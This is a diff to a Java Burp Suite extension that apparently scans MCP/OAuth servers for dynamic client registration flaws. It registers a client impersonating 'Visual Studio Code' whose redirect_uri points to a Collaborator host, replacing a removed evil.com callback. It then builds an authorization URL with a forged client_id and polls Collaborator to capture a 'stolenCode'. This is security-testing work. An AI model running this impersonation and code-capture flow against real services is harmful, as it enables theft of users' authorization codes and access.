@@ -739,6 +739,24 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInser
 
     // 新增：用于记录已经打印过的拓扑信息，防止控制台日志刷屏冗余
     private static Set<String> printedTopology = java.util.concurrent.ConcurrentHashMap.newKeySet();
+    private Set<String> reportedF2Hosts = java.util.concurrent.ConcurrentHashMap.newKeySet();
+    private Set<String> reportedF2PendingValidationHosts = java.util.concurrent.ConcurrentHashMap.newKeySet();
+    private Map<String, DcrValidationContext> dcrValidationContexts = new java.util.concurrent.ConcurrentHashMap<>();
+
+    private class DcrValidationContext {
+        public String hostKey;
+        public IHttpService issueService;
+        public URL issueUrl;
+        public IHttpRequestResponse baseRequestResponse;
+        public IHttpRequestResponse registrationResponse;
+        public IBurpCollaboratorClientContext collaboratorContext;
+        public String collabPayload;
+        public String registeredClientName;
+        public String registeredClientId;
+        public String manualClientId;
+        public String evilRedirectUri;
+        public String manualAuthorizationUrl;
+    }
 
     /**
      * 核心算法：基于发货与收货拓扑关系的层级推断
@@ -977,6 +995,205 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInser
         return issueDetails;
     }
 
+    private String extractJsonStringValue(String data, String keyName) {
+        if (data == null || keyName == null) {
+            return null;
+        }
+        Matcher matcher = Pattern.compile("(?i)\"" + Pattern.quote(keyName) + "\"\\s*:\\s*\"([^\"]+)\"").matcher(data);
+        if (matcher.find()) {
+            return matcher.group(1).replace("\\/", "/");
+        }
+        return null;
+    }
+
+    private String buildDcrAuthorizationUrl(String authorizationEndpoint, String clientId, String redirectUri) {
+        if (authorizationEndpoint == null || authorizationEndpoint.isEmpty() || clientId == null || clientId.isEmpty()) {
+            return null;
+        }
+        String separator = authorizationEndpoint.contains("?") ? "&" : "?";
+        return authorizationEndpoint + separator +
+                "response_type=code" +
+                "&client_id=" + helpers.urlEncode(clientId) +
+                "&redirect_uri=" + helpers.urlEncode(redirectUri) +
+                "&scope=openid" +
+                "&state=mcpoauthscan_dcr_" + System.currentTimeMillis();
+    }
+
+    private String inferAuthorizationEndpoint(URL contextUrl, String wellKnownBody) {
+        String endpoint = extractJsonStringValue(wellKnownBody, "authorization_endpoint");
+        if (endpoint != null) {
+            return endpoint;
+        }
+
+        if (contextUrl == null) {
+            return null;
+        }
+        String origin = contextUrl.getProtocol() + "://" + contextUrl.getHost();
+        if (contextUrl.getPort() != -1 && contextUrl.getPort() != contextUrl.getDefaultPort()) {
+            origin += ":" + contextUrl.getPort();
+        }
+        return origin + "/authorize";
+    }
+
+    private void startDcrCodeOastPolling(
+            IHttpService issueService,
+            URL issueUrl,
+            IHttpRequestResponse baseRequestResponse,
+            IHttpRequestResponse registrationResponse,
+            IBurpCollaboratorClientContext collaboratorContext,
+            String collabPayload,
+            String registeredClientName,
+            String manualClientId,
+            String evilRedirectUri,
+            String manualAuthorizationUrl) {
+
+        new Thread(() -> {
+            int pollingAttempts = 30;
+            int sleepInterval = 10000;
+            stdout.println("[*] F2 pending validation: " + collabPayload);
+
+            for (int i = 0; i < pollingAttempts; i++) {
+                try {
+                    Thread.sleep(sleepInterval);
+                } catch (InterruptedException e) {
+                    break;
+                }
+
+                try {
+                    List<IBurpCollaboratorInteraction> interactions = collaboratorContext.fetchAllCollaboratorInteractions();
+                    if (interactions == null || interactions.isEmpty()) {
+                        continue;
+                    }
+
+                    StringBuilder interactionDetails = new StringBuilder();
+                    String stolenCode = null;
+
+                    for (IBurpCollaboratorInteraction interaction : interactions) {
+                        interactionDetails.append("<b>Type:</b> ").append(interaction.getProperty("type")).append("<br>");
+                        interactionDetails.append("<b>Client IP:</b> ").append(interaction.getProperty("client_ip")).append("<br>");
+
+                        if ("http".equalsIgnoreCase(interaction.getProperty("type"))) {
+                            String reqBase64 = interaction.getProperty("request");
+                            if (reqBase64 != null) {
+                                byte[] reqBytes = helpers.base64Decode(reqBase64);
+                                String reqString = helpers.bytesToString(reqBytes);
+                                Matcher codeMatcher = Pattern.compile("(?i)(?:[?&]|\\b)(?:code|authCode)=([^&\\s]+)").matcher(reqString);
+                                if (codeMatcher.find()) {
+                                    stolenCode = helpers.urlDecode(codeMatcher.group(1));
+                                }
+                                interactionDetails.append("<pre>")
+                                        .append(reqString.replace("<", "&lt;").replace(">", "&gt;"))
+                                        .append("</pre><br><hr>");
+                            }
+                        }
+                    }
+
+                    if (stolenCode != null) {
+                        callbacks.addScanIssue(new CustomScanIssue(
+                                issueService,
+                                issueUrl,
+                                new IHttpRequestResponse[] {
+                                        callbacks.applyMarkers(baseRequestResponse, null, null),
+                                        callbacks.applyMarkers(registrationResponse, null, null)
+                                },
+                                "[Flaw 2] Client Identity Blind Trust (OAST Confirmed)",
+                                "<b>Firm evidence for Client Identity Blind Trust.</b><br><br>" +
+                                        "The scanner first confirmed F1 by registering a client with <code>client_name</code> set to <code>" + registeredClientName + "</code> and <code>redirect_uris</code> set to the Burp Collaborator callback <code>" + evilRedirectUri + "</code>.<br><br>" +
+                                        "The manual authorization link then used the forged <code>client_id</code>: <code>" + manualClientId + "</code>.<br><br>" +
+                                        "After the manual authorization link was visited, Burp Collaborator received an HTTP callback carrying an authorization code: <code>" + stolenCode + "</code>.<br><br>" +
+                                        "<b>Manual authorization URL:</b><br><code style='word-break: break-all;'>" + manualAuthorizationUrl + "</code><br><br>" +
+                                        "<b>Collaborator evidence:</b><br>" + interactionDetails,
+                                "High",
+                                "Firm"
+                        ));
+                        stdout.println("[!] F2 pending validation confirmed. Code captured for payload: " + collabPayload);
+                        return;
+                    }
+                } catch (Exception e) {
+                    stderr.println("[-] Error in F1 DCR OAST polling thread: " + e.toString());
+                }
+            }
+
+            stdout.println("[-] F2 pending validation polling thread finished without code for payload: " + collabPayload);
+        }).start();
+    }
+
+    private String getF2ValidationHostKey(IHttpRequestResponse message) {
+        if (message == null || message.getHttpService() == null) {
+            return null;
+        }
+        return message.getHttpService().getHost().toLowerCase();
+    }
+
+    private IScanIssue rememberDcrValidationContext(DcrValidationContext context) {
+        if (context == null || context.hostKey == null || context.manualAuthorizationUrl == null) {
+            return null;
+        }
+        dcrValidationContexts.put(context.hostKey, context);
+        if (reportedF2Hosts.contains(context.hostKey)) {
+            return emitF2PendingValidationIssue(context, false);
+        }
+        return null;
+    }
+
+    private IScanIssue rememberF2DetectedAndReportPendingIfReady(IHttpRequestResponse baseRequestResponse) {
+        String hostKey = getF2ValidationHostKey(baseRequestResponse);
+        if (hostKey == null) {
+            return null;
+        }
+        reportedF2Hosts.add(hostKey);
+        DcrValidationContext context = dcrValidationContexts.get(hostKey);
+        if (context != null) {
+            return emitF2PendingValidationIssue(context, false);
+        }
+        return null;
+    }
+
+    private IScanIssue emitF2PendingValidationIssue(DcrValidationContext context, boolean addViaCallback) {
+        if (context == null || context.hostKey == null || !reportedF2PendingValidationHosts.add(context.hostKey)) {
+            return null;
+        }
+
+        IScanIssue issue = new CustomScanIssue(
+                context.issueService,
+                context.issueUrl,
+                new IHttpRequestResponse[] {
+                        callbacks.applyMarkers(context.baseRequestResponse, null, null),
+                        callbacks.applyMarkers(context.registrationResponse, null, null)
+                },
+                "[Flaw 2 validation] Pending User Action: Client Identity Blind Trust",
+                "<b>Manual validation required.</b><br><br>" +
+                        "Flaw 2 has already been detected, and Flaw 1 has provided a dynamically registered Collaborator redirect_uri that can be used for validation.<br><br>" +
+                        "<b>Registered DCR client_id:</b> <code>" + context.registeredClientId + "</code><br>" +
+                        "<b>Forged client_id used for Flaw 2 validation:</b> <code>" + context.manualClientId + "</code><br>" +
+                        "<b>Collaborator redirect_uri:</b> <code>" + context.evilRedirectUri + "</code><br><br>" +
+                        "<b>Manual authorization URL:</b><br><code style='word-break: break-all;'>" + context.manualAuthorizationUrl + "</code><br><br>" +
+                        "Open the URL in an authenticated browser routed through Burp and complete the authorization flow. " +
+                        "The scanner will poll Burp Collaborator for 5 minutes. If the callback contains <code>code</code> or <code>authCode</code>, a Firm Flaw 2 confirmation issue will be added automatically.",
+                "Information",
+                "Certain"
+        );
+
+        if (addViaCallback) {
+            callbacks.addScanIssue(issue);
+        }
+
+        startDcrCodeOastPolling(
+                context.issueService,
+                context.issueUrl,
+                context.baseRequestResponse,
+                context.registrationResponse,
+                context.collaboratorContext,
+                context.collabPayload,
+                context.registeredClientName,
+                context.manualClientId,
+                context.evilRedirectUri,
+                context.manualAuthorizationUrl
+        );
+
+        return issue;
+    }
+
 
 
     // Helper method to search a response for occurrences of a literal match string
@@ -1136,7 +1353,6 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInser
 
         // 1. 获取当前请求的拓扑层级，并驱动状态机建树
         String layer = identifyLayer(baseRequestResponse);
-        flowEngine.processPassiveTraffic(helpers, baseRequestResponse);
 
         // 2. L3 外部 IdP 发现 (黑盒隔离)
         if ("L3".equals(layer)) {
@@ -1223,9 +1439,15 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInser
                 stdout.println("[+] MCP Passive Scan: Intercepted DCR request, Triggering Abuse test on " + reqPathRaw);
 
                 try {
+                    IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
+                    String collabPayload = collaboratorContext.generatePayload(true);
+                    String evilRedirectUri = "https://" + collabPayload;
+                    String registeredClientName = "Visual Studio Code";
+                    String manualClientId = "fake_evil_mcp_client_" + System.currentTimeMillis();
+
                     // 精准篡改 client_name 和 redirect_uris
-                    String tamperedBody = currentReqBodyStr.replaceAll("(?i)(\"client_name\"\\s*:\\s*\")[^\"]+(\")", "$1Visual Studio Code$2");
-                    tamperedBody = tamperedBody.replaceAll("(?i)(\"redirect_uris\"\\s*:\\s*\\[)[^\\]]+(\\])", "$1\"https://evil.com/callback\"$2");
+                    String tamperedBody = currentReqBodyStr.replaceAll("(?i)(\"client_name\"\\s*:\\s*\")[^\"]+(\")", "$1" + registeredClientName + "$2");
+                    tamperedBody = tamperedBody.replaceAll("(?i)(\"redirect_uris\"\\s*:\\s*\\[)[^\\]]+(\\])", "$1\"" + evilRedirectUri + "\"$2");
 
                     byte[] newBodyBytes = helpers.stringToBytes(tamperedBody);
 
@@ -1240,7 +1462,11 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInser
                         String checkResponseStr = helpers.bytesToString(checkResponse.getResponse());
 
                         if (checkRespInfo.getStatusCode() >= 200 && checkRespInfo.getStatusCode() < 300
-                                && checkResponseStr.contains("client_id") && checkResponseStr.contains("evil.com")) {
+                                && checkResponseStr.contains("client_id") && checkResponseStr.contains(collabPayload)) {
+
+                            String registeredClientId = extractJsonStringValue(checkResponseStr, "client_id");
+                            String authorizationEndpoint = inferAuthorizationEndpoint(reqInfo.getUrl(), null);
+                            String manualAuthorizationUrl = buildDcrAuthorizationUrl(authorizationEndpoint, manualClientId, evilRedirectUri);
 
                             issues.add(new CustomScanIssue(
                                     baseRequestResponse.getHttpService(), reqInfo.getUrl(),
@@ -1253,6 +1479,26 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInser
                                             "<b>投递的无损篡改载荷：</b><br><code>" + tamperedBody + "</code>",
                                     "High", "Firm"
                             ));
+
+                            if (manualAuthorizationUrl != null) {
+                                DcrValidationContext validationContext = new DcrValidationContext();
+                                validationContext.hostKey = getF2ValidationHostKey(baseRequestResponse);
+                                validationContext.issueService = baseRequestResponse.getHttpService();
+                                validationContext.issueUrl = reqInfo.getUrl();
+                                validationContext.baseRequestResponse = baseRequestResponse;
+                                validationContext.registrationResponse = checkResponse;
+                                validationContext.collaboratorContext = collaboratorContext;
+                                validationContext.collabPayload = collabPayload;
+                                validationContext.registeredClientName = registeredClientName;
+                                validationContext.registeredClientId = registeredClientId;
+                                validationContext.manualClientId = manualClientId;
+                                validationContext.evilRedirectUri = evilRedirectUri;
+                                validationContext.manualAuthorizationUrl = manualAuthorizationUrl;
+                                IScanIssue pendingIssue = rememberDcrValidationContext(validationContext);
+                                if (pendingIssue != null) {
+                                    issues.add(pendingIssue);
+                                }
+                            }
                         }
                     }
                 } catch (Exception e) {
@@ -1278,11 +1524,17 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInser
 
                         try {
                             java.net.URL regUrl = new java.net.URL(regEndpoint);
+                            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
+                            String collabPayload = collaboratorContext.generatePayload(true);
+                            String evilRedirectUri = "https://" + collabPayload;
+                            String registeredClientName = "Visual Studio Code";
+                            String manualClientId = "fake_evil_mcp_client_" + System.currentTimeMillis();
+                            String authorizationEndpoint = inferAuthorizationEndpoint(reqInfo.getUrl(), responseBodyStr);
 
 
                             String fatPayload = "{" +
-                                    "\"client_name\": \"Visual Studio Code\"," +
-                                    "\"redirect_uris\": [\"https://evil.com/callback\"]," +
+                                    "\"client_name\": \"" + registeredClientName + "\"," +
+                                    "\"redirect_uris\": [\"" + evilRedirectUri + "\"]," +
                                     "\"grant_types\": [\"authorization_code\", \"refresh_token\"]," +
                                     "\"response_types\": [\"code\"]," +
                                     "\"token_endpoint_auth_method\": \"none\"" +
@@ -1302,12 +1554,15 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInser
                             IHttpService regHttpService = helpers.buildHttpService(regUrl.getHost(), regUrl.getPort() == -1 ? regUrl.getDefaultPort() : regUrl.getPort(), regUrl.getProtocol().equals("https"));
                             IHttpRequestResponse regResponse = callbacks.makeHttpRequest(regHttpService, regRequest);
 
-                            if (regResponse.getResponse() != null) {
+                            if (regResponse != null && regResponse.getResponse() != null) {
                                 IResponseInfo regRespInfo = helpers.analyzeResponse(regResponse.getResponse());
                                 String regResponseStr = helpers.bytesToString(regResponse.getResponse());
 
                                 if (regRespInfo.getStatusCode() >= 200 && regRespInfo.getStatusCode() < 300
-                                        && regResponseStr.contains("client_id") && regResponseStr.contains("evil.com")) {
+                                        && regResponseStr.contains("client_id") && regResponseStr.contains(collabPayload)) {
+
+                                    String registeredClientId = extractJsonStringValue(regResponseStr, "client_id");
+                                    String manualAuthorizationUrl = buildDcrAuthorizationUrl(authorizationEndpoint, manualClientId, evilRedirectUri);
 
                                     issues.add(new CustomScanIssue(
                                             baseRequestResponse.getHttpService(), reqInfo.getUrl(),
@@ -1320,6 +1575,26 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInser
                                                     "<b>扫描器自动生成的智能载荷：</b><br><code>" + fatPayload + "</code>",
                                             "High", "Firm"
                                     ));
+
+                                    if (manualAuthorizationUrl != null) {
+                                        DcrValidationContext validationContext = new DcrValidationContext();
+                                        validationContext.hostKey = getF2ValidationHostKey(baseRequestResponse);
+                                        validationContext.issueService = baseRequestResponse.getHttpService();
+                                        validationContext.issueUrl = reqInfo.getUrl();
+                                        validationContext.baseRequestResponse = baseRequestResponse;
+                                        validationContext.registrationResponse = regResponse;
+                                        validationContext.collaboratorContext = collaboratorContext;
+                                        validationContext.collabPayload = collabPayload;
+                                        validationContext.registeredClientName = registeredClientName;
+                                        validationContext.registeredClientId = registeredClientId;
+                                        validationContext.manualClientId = manualClientId;
+                                        validationContext.evilRedirectUri = evilRedirectUri;
+                                        validationContext.manualAuthorizationUrl = manualAuthorizationUrl;
+                                        IScanIssue pendingIssue = rememberDcrValidationContext(validationContext);
+                                        if (pendingIssue != null) {
+                                            issues.add(pendingIssue);
+                                        }
+                                    }
                                 }
                             }
                         } catch (Exception e) {
@@ -5034,6 +5309,10 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInser
                                 "检测到 MCP 网关对 client_id 缺乏边界信任管控。我们注入了完全伪造的客户端标识 (<code>" + fakeClientId + "</code>)，服务端并未抛出 invalid_client 错误（重定向或页面内容未见拦截特征），而是继续推进了授权状态机。这表明系统可能允许任意恶意客户端接入。",
                                 "Medium", "Tentative"
                         ));
+                        IScanIssue pendingIssue = rememberF2DetectedAndReportPendingIfReady(baseRequestResponse);
+                        if (pendingIssue != null) {
+                            issues.add(pendingIssue);
+                        }
                     }
                 }
             }
